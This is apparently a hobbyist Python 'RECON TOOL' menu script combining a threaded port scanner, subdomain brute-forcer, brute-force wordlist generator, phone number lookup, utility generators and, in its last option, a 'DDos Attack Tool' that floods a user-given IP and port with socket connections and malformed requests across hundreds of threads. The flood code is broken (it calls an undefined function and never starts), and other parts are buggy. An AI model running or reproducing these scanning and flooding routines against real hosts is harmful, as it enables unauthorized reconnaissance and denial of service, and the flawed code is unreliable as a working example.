import os
import time
from tqdm import *
from pyfiglet import Figlet
import requests
import random
import itertools
import sys
import pyqrcode
from barcode import EAN13
from queue import Queue
import socket
import threading
from barcode.writer import ImageWriter
import pyfiglet
import phonenumbers
from phonenumbers import carrier
from phonenumbers import geocoder
from tabulate import tabulate

result = pyfiglet.figlet_format("RECON TOOL",font="slant")
print(result)

options = ( 
    "\n 1. IP scanner \n 2. Port Scanner \n 3. Barcode Generator \n 4. QRCode Generator \n 5. Password Generator \n 6. Wordlist Generator \n 7. Phone number information gathering \n 8. Subdomain Checker \n 9. DDos Attack Tool \n "
    )
print(options)
select = int(input("ENTER YOUR CHOICE "R""">>>>>>------------------>"""))

match select :
    case 1:

        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("Loading Done!...")


        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750,height=30):
            os.system("cls")
            os.system(f"mode con: cols={columns} lines={height}")


        if __name__=="__main__":
            window_size(80,20)
            print(font("IP SCANNER"))
            loading()
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            print("Device is :" + hostname)
            print("IP Address :" + IPAddr)
            input("PRESS ENTER TO EXIT")


    case 2:
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("Loading Done!...")


        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750,height=30):
            os.system("cls")
            os.system("stty cols %s rows %s" % (columns , height))


        def portscan(port):
            try:
                sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                sock.connect((target, port))
                return True
            except:
                return False


        def get_ports (mode):
            if mode == 1:
                for port in range(1, 1024): 
                    queue.put(port)
            elif mode == 2:
                for port in range(1, 49152): 
                    queue.put(port)
            elif mode == 3:
                ports = [20, 21, 22, 23, 25, 53, 80, 116, 443] 
                for port in ports: 
                    queue.put(port)
            elif mode == 4:
                ports=input("Enter your ports (seperate by blank):") 
                ports=ports.split()
                ports = list(map(int, ports))
                for port in ports:
                    queue.put(port)


        def worker():
            while not queue.empty():
                port = queue.get()
                if portscan(port):
                    print("Port {} is open!".format(port))
                    open_ports.append(port)


        def run_scanner(threads , mode):

            get_ports(mode)
            thread_list = []

            for t in range(threads):
                thread = threading.Thread(target=worker)
                thread_list.append(thread)

            for thread in thread_list:
                thread.start()

            for thread in thread_list:
                thread.join()

            print("Open Ports are :" , open_ports)

        if __name__=="__main__":
            window_size(80,20)
            print(font("PORT SCANNER"))
            loading()
            print("IT TAKES TIME ACCORDING TO THE OPEN PORT AND PROVIDED IP")
            target = input("ENTER IP ADRESS TO SCAN"R""">>>>>---------->""")
            mode=int(input("Enter Port Scan Mode"))
            queue = Queue()
            open_ports = []
            run_scanner(100 , mode)

        input("PRESS ENTER TO EXIT")
       
    case 3:

        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("Loading Done!...")

        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750,height=30):
            os.system("cls")
            os.system("stty cols %s rows %s" % (columns , height))


        def generator(number):
            my_code = EAN13(number ,writer=ImageWriter())
            my_code.save("bar_code")
        
        if __name__=="__main__":
            window_size(80,20)
            print(font("BARCODE GENARATOR"))
            loading()
            print("GENERATED BARCODE WILL BE SAVED AS PNG FILE")

            innumber = input("Enter 13 Digit Number to generate Bar code"R""">>>>>--------->""")
            print(innumber)
            generator(innumber)
            input("PRESS ENTER TO EXIT")

    case 4:

        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)


            print("Loading Done!...")

        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))



        def window_size(columns=750,height=30):
            os.system("cls")
            os.system("stty cols %s rows %s" % (columns , height))


        if __name__=="__main__":
            window_size(80,20)
            print(font("QRCODE GENARATOR"))
            loading()
            print("GENERATED QR CODE WILL BE SAVED AS MYQR.PNG IN THE FILE")

            s=input("Enter the link to create a qrCode"R""">>>>>--------->""")
            url = pyqrcode.create(s)
            url.svg("myqr.svg",scale=8)
            url.png("myqr1.png",scale=6)
            input("PRESS ENTER TO EXIT")


    case 5:
         def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("Let's Move !...")


         def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


         def window_size(columns=750,height=75):
            os.system("clear")
            os.system("stty cols %s rows %s" % (columns , height))



         if __name__=="__main__":
            window_size(80,20)
            print(font("PASSWORD GENERATOR"))
            loading()
            length = int(input("Enter the Length of the Password "R""">>>>>--------->"""))


            def get_random_string(length):
                lower = "abcdefghijklmnopqrstuvwxyz"
                upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                numbers = "1234567890"
                symbols = "!@#$%^&*()?/\[]{}"
                all = lower + symbols + numbers + upper
                password = "".join(random.sample(all,length))
                print("Generated Password of Length" , length, "is",password,R""">>>>>---------->""")


            get_random_string(length)
            input("PRESS ENTER TO EXIT")

    case 6:

        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("Loading Done!...")


        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750,height=30):
            os.system("cls")
            os.system("stty cols %s rows %s" % (columns , height))


        if __name__=="__main__":
            window_size(80,20)
            print(font("WORDLIST GENARATOR"))
            loading()
            print("Generated Password is saved in the file")
            chrs = input("Enter the Letters for the Combinatiotion"R""">>>>>---------->""")
            l = int(input("Minimum Length of the Password"R""">>>>>---------->"""))
            k = l
            j = int(input("Maximum Length of the Password"R""">>>>>---------->"""))
            n = j + 1
            mtl = len(chrs)
            p = []
            zt = input("[+]Enter the name of the file"R""">>>>>---------->""")
            for ltp in range (k,n):
                ans = mtl ** ltp
                p.append(ans)
                tLine = sum(p)
                input("Are You Ready ? [PRESS ENTER]")
                time1 = time.asctime()
                start = time.time()
                psd = open(zt, 'a')

                for i in range (k,n):
                    r = i*100/n
                    l = str(r) + 'percent'
                    sys.stdout.write("\r%s" %1)
                    sys.stdout.flush()
                    psd.flush()

                    for xs in itertools.product(chrs,repeat=i):
                        psd.write(''.join(xs) + '\n')
                        psd.flush()

            psd.close()
            sys.stdout.write("Success")
            end = time.time()
            '\t [+] Process Completed     :',time.asctime()
            totaltime = end - start
            rate = tLine / totaltime

            input("Press Enter To Exit")


    case 7:

        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("Loading Done!...")


        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750,height=30):
            os.system("cls")
            os.system("stty cols %s rows %s" % (columns , height))


        if __name__=="__main__":
            window_size(80,20)
            print(font("PHONE NUMBER INFORMATION GATHERING"))
            loading()


            def num_scanner(phn_num): 
                number = phonenumbers.parse(phn_num)
                print(number)
                description = geocoder.description_for_number(number,'en')
                supplier = carrier.name_for_number(number,'en')
                info = [["country", "SUPPLIER"], [description, supplier]]
                data = str(tabulate(info, headers="firstrow", tablefmt="github"))
                return data


        if __name__== "__main__":
            number = input("Enter the number "f""">>>>>>------------->""")
            print(num_scanner(number))
            input("PRESS ENTER TO EXIT")


    case 8:
        
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=75):
                time.sleep(0.01)
            print("Loading Done!...")


        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750,height=30):
            os.system("cls")
            os.system("stty cols %s rows %s" % (columns , height))


        if __name__=="__main__":
            window_size(80,20)
            print(font("SUBDOMAIN CHECKER"))
            loading()
            print(" IT TAKES TIME ACCORDING TO THE DOMAIN")
            print(" USINT DEFAULT ADDED WORDLIST WITH 649649 WORDS")
            domain = input("ENTER THE DOMAIN TO SCAN"r""">>>>----->""")
            file = open("subdomain.txt")
            content = file.read()
            subdomains = content.splitlines()
            for subdomain in subdomains:
                url = f"https://{subdomain}.{domain}"
                try:
                 requests.get(url)
                 print("[+]Discovered subdomain:", url)
                except requests.ConnectionError:
                 print("[x]Subdomain not found:", url)


        input("PRESS ENTER TO EXIT")


        

    case 9:
        def loading():
            for _ in tqdm(range(100),desc="LOADING...",ascii=False,ncols=60):
                time.sleep(0.01)
            print("Loading Done!...")


        def font(text):
            cool_text = Figlet(font="slant")
            return str(cool_text.renderText(text))


        def window_size(columns=750,height=30):
            os.system("cls")
            os.system("stty cols %s rows %s" % (columns , height))

        if __name__=="__main__":
            window_size(80,20)
            print(font("DDos Attack Tool"))
            loading()

            target = input("Enter the IP Address"r""">>>---------->""")
            port = int(input("Enter the Port"r""">>>---------->"""))
            fake_ip='198.168.1.115'
            already_connected = 0

            def attach():
                while True:
                    s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
                    s.connect((target , port))
                    s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode(ascii),(target , port))
                    s.sendto(("GET /" + fake_ip + "HTTP/1.1\r\n").encode(ascii),(target , port))
                    s.close()
                    global already_connected
                    already_connected +=1
                    if already_connected%500 ==0:
                        print(already_connected)

                    for i in range(500):
                        thread = threading.Thread(target=attack)
                        thread.start()
                        
        input("PRESS ENTER TO EXIT")